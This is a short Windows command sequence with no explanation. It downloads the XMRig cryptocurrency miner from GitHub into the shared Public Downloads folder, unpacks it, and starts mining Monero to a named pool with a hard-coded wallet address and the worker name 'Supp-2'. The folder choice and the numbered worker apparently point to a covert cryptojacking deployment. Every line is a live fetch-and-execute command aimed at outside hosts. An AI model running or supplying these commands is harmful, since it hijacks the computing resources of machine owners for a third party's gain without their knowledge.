powershell Invoke-WebRequest -Uri "https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-gcc-win64.zip" -OutFile "C:\Users\Public\Downloads\xmrig.zip"
powershell Expand-Archive -LiteralPath C:\Users\Public\Downloads\xmrig.zip -DestinationPath C:\Users\Public\Downloads
C:\Users\Public\Downloads\xmrig-6.18.1\xmrig.exe --coin=XMR -o pool.supportxmr.com:3333 -u 8635LEjQNMTKA3itCDvKGujmHLgYn33hhjiX7uat5VKhi7WThxFw8t5C2mfaiaF86JHCPHWWTmHZwjEgVt9RNAyo7ueQgKW.Supp-2 -p x -t 6
